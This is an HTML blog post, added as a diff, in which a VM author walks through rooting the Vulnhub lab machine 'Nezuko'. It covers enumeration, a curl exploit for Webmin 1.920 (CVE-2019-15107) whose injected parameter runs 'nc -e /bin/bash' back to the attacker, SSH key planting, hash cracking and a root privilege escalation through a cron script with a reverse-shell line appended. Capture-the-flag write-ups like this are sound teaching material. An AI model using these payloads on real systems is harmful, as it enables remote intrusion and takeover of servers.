@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/musubi/assets/css/style.css?v=">
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.9"></script>
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>VM Nezuko Boot2Root Writeup | Musubi</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="VM Nezuko Boot2Root Writeup" />
+<meta name="author" content="yunaranyancat" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the vm and come back when you have finished." />
+<meta property="og:description" content="Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the vm and come back when you have finished." />
+<link rel="canonical" href="http://localhost:4000/musubi/others/vm_nezuko" />
+<meta property="og:url" content="http://localhost:4000/musubi/others/vm_nezuko" />
+<meta property="og:site_name" content="Musubi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-08-21T00:00:00+08:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/musubi/others/vm_nezuko","headline":"VM Nezuko Boot2Root Writeup","dateModified":"2019-08-21T00:00:00+08:00","datePublished":"2019-08-21T00:00:00+08:00","author":{"@type":"Person","name":"yunaranyancat"},"description":"Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the vm and come back when you have finished.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/musubi/others/vm_nezuko"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <!-- <div class="container">
+        <h1>Musubi</h1>
+        <h2>Hey visitor, welcome to my site! (๑>ᴗ<๑)</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div> -->
+
+      <div class="container">
+        <h1>Musubi</h1>
+        <!-- <h2>Hey visitor, welcome to my site! (๑>ᴗ<๑)</h2> -->
+        
+      </div>
+      
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>21 August 2019</small>
+<h1>VM Nezuko Boot2Root Writeup</h1>
+
+
+<p class="view">by yunaranyancat</p>
+
+
+<p>Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the <a href="https://www.vulnhub.com/entry/nezuko-1,352/">vm</a> and come back when you have finished.</p>
+
+<h3 id="about-nezuko-vm">About Nezuko VM</h3>
+
+<p><img src="/musubi/assets/vm_nezuko/nezukovm.png" alt="nezukovm" /></p>
+
+<p>I would consider this as an easy to intermediate level machine. But, if you need some hints, do reach me on <a href="htttps://twitter.com/yunaranyancat">Twitter</a></p>
+
+<h2 id="walkthrough">Walkthrough</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Let’s assume that we put our attacking machine (Kali) and Nezuko VM inside the same subnet which is <code class="highlighter-rouge">10.10.10.0/24</code> .
+Therefore, by running <code class="highlighter-rouge">netdiscover -i eth0 -r 10.10.10.0/24</code> , we will find out that Nezuko vm is located at <code class="highlighter-rouge">10.10.10.4</code>.</p>
+
+<p>p/s : the Kali vm has an IP of <code class="highlighter-rouge">10.10.10.5</code> . This is useful for us to create a reverse shell later.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/netdiscover.png" alt="netdiscover" /></p>
+
+<p>By running <code class="highlighter-rouge">nmap -sS -sC -sV -oA nezukocommon 10.10.10.4</code> , we will get the following output.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/nmapcommon.png" alt="nmapcommon" /></p>
+
+<p>Now, let’s go to the webpage of <code class="highlighter-rouge">10.10.10.4</code> .</p>
+
+<p><img src="/musubi/assets/vm_nezuko/nezukowebpage.png" alt="nezukowebpage" /></p>
+
+<p>Nothing interesting except for nezuko chan.. ಥ ⌣ ಥ</p>
+
+<p>By going to <code class="highlighter-rouge">10.10.10.4/robots.txt</code> , we will find an encoded text there.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/robotswebpage.png" alt="robotswebpage" /></p>
+
+<p>The text is encoded with base32. Using online decoder such as this <a href="https://emn178.github.io/online-tools/base32_decode.html">site</a> , we will get below plaintext.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/base32_decoded.png" alt="base32_decoded" /></p>
+
+<p>Since we got a hint from nezuko saying this is not the right port to enumerate. We will run an nmap scan again now to scan all ports.</p>
+
+<p>Note : By default, nmap will only scan for common 1000 ports. You can check the specific ports that nmap scans using the default scan on this <a href="https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/">site</a>.</p>
+
+<p>By running <code class="highlighter-rouge">nmap -sS -sC -sV -p- -oA nezukoallports 10.10.10.4</code> , we will get below output.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/nmapallports.png" alt="nmapallports" /></p>
+
+<p>It seems that port <code class="highlighter-rouge">13337</code> is running a <code class="highlighter-rouge">webmin</code> service. This might be an entry point for us.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>The target is running <code class="highlighter-rouge">webmin 1.920</code> . After some searching for webmin vulnerabilities, we will find a remote code execution vulnerability related to this specific version of webmin.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/47293">https://www.exploit-db.com/exploits/47293</a></li>
+</ul>
+
+<p><img src="/musubi/assets/vm_nezuko/testexploit.png" alt="testexploit" /></p>
+
+<p>Another link will lead us to a Metasploit module. However, we will not be using Metasploit because it will ruin all of the fun.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/47230">https://www.exploit-db.com/exploits/47230</a></li>
+</ul>
+
+<p><img src="/musubi/assets/vm_nezuko/metasploit.png" alt="metasploit" /></p>
+
+<p>Copy the shell script (in the first link) to our Kali to test if the target is vulnerable to rce exploit or not.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/vulnerablecheck.png" alt="vulnerablecheck" /></p>
+
+<p>So it seems that the target is vulnerable.</p>
+
+<p>We will modify the test code so that we can get a shell from the machine.</p>
+
+<p>Our final exploit code should look something like this.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
+<span class="nv">URI</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span>
+
+<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Exploit for RCE (CVE-2019-15107) on </span><span class="nv">$URI</span><span class="s2">: "</span><span class="p">;</span>
+curl <span class="nt">-ks</span> <span class="nv">$URI</span><span class="s1">'/password_change.cgi'</span> <span class="nt">-d</span> <span class="s1">'user=wheel&amp;pam=&amp;expired=2&amp;old=id|nc -e /bin/bash 10.10.10.5 1337 &amp;new1=wheel&amp;new2=wheel'</span> <span class="nt">-H</span> <span class="s1">'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-H</span> <span class="s1">'Referer: '</span><span class="nv">$URI</span><span class="s1">'/session_login.cgi'</span> <span class="nt">-X</span> POST</code></pre></figure>
+
+<p>Before running the exploit we should start our netcat listener on our Kali.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/listener_1337.png" alt="listener_1337" /></p>
+
+<p>Then run the exploit code,</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~#sh exploit.sh https://10.10.10.4:13337</code></pre></figure>
+
+<p><img src="/musubi/assets/vm_nezuko/nezuko_shell.png" alt="nezuko_shell" /></p>
+
+<p>We got a shell as nezuko!</p>
+
+<h3 id="optional-upgrade-to-ssh-session">(Optional) Upgrade to SSH session</h3>
+
+<p>We can obtain ssh session as nezuko by adding our public key to <code class="highlighter-rouge">/home/nezuko/.ssh/authorized_keys</code>.</p>
+
+<p>First we need to generate our own private and public SSH key.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~#ssh-keygen <span class="nt">-t</span> rsa</code></pre></figure>
+
+<p>Save the key in our current working directory by putting a name when prompted for the filename, in this case, the filename will be <code class="highlighter-rouge">yunaranyancat</code></p>
+
+<p>Copy the content of <code class="highlighter-rouge">yunaranyancat.pub</code> to <code class="highlighter-rouge">/home/nezuko/.ssh/authorized_keys</code></p>
+
+<p><img src="/musubi/assets/vm_nezuko/ssh-keygen.png" alt="ssh-keygen" /></p>
+
+<p><img src="/musubi/assets/vm_nezuko/copytoauthkeys.png" alt="copytoauthkeys" /></p>
+
+<p>After that we can ssh as nezuko using following command</p>
+
+<p><img src="/musubi/assets/vm_nezuko/sshprivate.png" alt="sshprivate" /></p>
+
+<h3 id="changing-user-to-zenitsu">Changing user to zenitsu</h3>
+
+<p>We find out that <code class="highlighter-rouge">/etc/passwd</code> is readable and furthermore, it reveals <code class="highlighter-rouge">zenitsu</code> password hash.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/etcpasswd.png" alt="etcpasswd" /></p>
+
+<p>We can try to crack the hash using hashcat by typing following command.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/copytocrack.png" alt="copytocrack" /></p>
+
+<p><img src="/musubi/assets/vm_nezuko/examplehash.png" alt="examplehash" /></p>
+
+<p>And after waiting for a while, the hash has been cracked and stored inside file <code class="highlighter-rouge">cracked</code>.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/cracked.png" alt="cracked" /></p>
+
+<p>Once we got the password, which is <code class="highlighter-rouge">meowmeow</code> , we can su as <code class="highlighter-rouge">zenitsu</code> user.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nezuko@ubuntu:~#su zenitsu</code></pre></figure>
+
+<p>and when prompted with password, put <code class="highlighter-rouge">meowmeow</code> and then click enter.</p>
+
+<h3 id="privilege-escalation">Privilege escalation</h3>
+
+<p>As <code class="highlighter-rouge">nezuko</code> user before, we found out that there is a folder named <code class="highlighter-rouge">from_zenitsu</code> in the home directory and now as <code class="highlighter-rouge">zenitsu</code>, we found a folder named <code class="highlighter-rouge">to_nezuko</code>. Upon inspecting both folder, we can say that these directories;</p>
+
+<ul>
+  <li>
+    <p>from_zenitsu : contains message sent by zenitsu every 5 minutes (based on the name of the messages)</p>
+  </li>
+  <li>
+    <p>to_nezuko : contains a bash script owned by zenitsu that will send a message to nezuko.</p>
+  </li>
+</ul>
+
+<p>However, upon further inspection, we found out that the script is being run by <code class="highlighter-rouge">root</code> instead. That’s why the messages sent to nezuko home directory are owned by <code class="highlighter-rouge">root</code>.</p>
+
+<p>We can verify it by running</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nezuko@ubuntu:~#ls <span class="nt">-la</span> /home/nezuko/from_zenitsu/<span class="k">*</span></code></pre></figure>
+
+<p>This means that, we can escalate our current privileges to <code class="highlighter-rouge">root</code> privileges by modifying the content of bash.</p>
+
+<p>Since the owner of the script is <code class="highlighter-rouge">zenitsu</code> , then it is possible to overwrite the script.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/cannot_change_bash.png" alt="cannot_change_bash" /></p>
+
+<p>But, it seems that we obtained <code class="highlighter-rouge">permission denied</code> when trying to overwrite the content of the bash script.</p>
+
+<h3 id="exploiting-file-attributes">Exploiting file attributes</h3>
+
+<p>When running <code class="highlighter-rouge">lsattr</code> on the bash script, it showed that the file attribute of the bash script has been changed to <code class="highlighter-rouge">a</code>(append) mode only. This means we can only append the script but cannot overwrite it.</p>
+
+<p><img src="/musubi/assets/vm_nezuko/lsattr.png" alt="lsattr" /></p>
+
+<p>With a slight modification to our command, we managed to append our own command which will connect to our Kali.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">zenitsu@ubuntu:~/to_nezuko<span class="nv">$echo</span> <span class="s2">"nc -e /bin/bash 10.10.10.5 1234"</span> <span class="o">&gt;&gt;</span> send_message_to_nezuko.sh</code></pre></figure>
+
+<p>Set up our listener to listen on port 1234</p>
+
+<p><img src="/musubi/assets/vm_nezuko/listener_1234.png" alt="listener_1234" /></p>
+
+<p>After waiting for couple of minutes for the script to be executed, we managed to get a root shell!</p>
+
+<p><img src="/musubi/assets/vm_nezuko/root.png" alt="root" /></p>
+
+<h3 id="wrap-up">Wrap up</h3>
+
+<p>Thank you for taking your time to read the writeup and I hope you enjoyed playing with my first vm. :&gt;</p>
+
+<p>Check out also <a href="/musubi/others/vm_aqua">vm_aqua</a></p>
+
+
+<!-- 
+  <small>tags: <em></em></small>
+ -->
+
+<p><a href="/musubi/index"> return to homepage</a> </p>
+
+      </section>
+    </div>
+
+    <!--  -->
+  </body>
+
+</html>
+<script>
+var typed = new Typed('#typed', {
+  stringsElement: '#typed-strings',
+  /**
+  * @property {number} typeSpeed type speed in milliseconds
+  */
+  typeSpeed: 80,
+  /**
+   * @property {number} backSpeed backspacing speed in milliseconds
+   */
+  backSpeed: 10,
+  /**
+   * @property {boolean} loop loop strings
+   * @property {number} loopCount amount of loops
+   */
+  loop: true,
+  loopCount: Infinity,
+
+
+});
+</script>
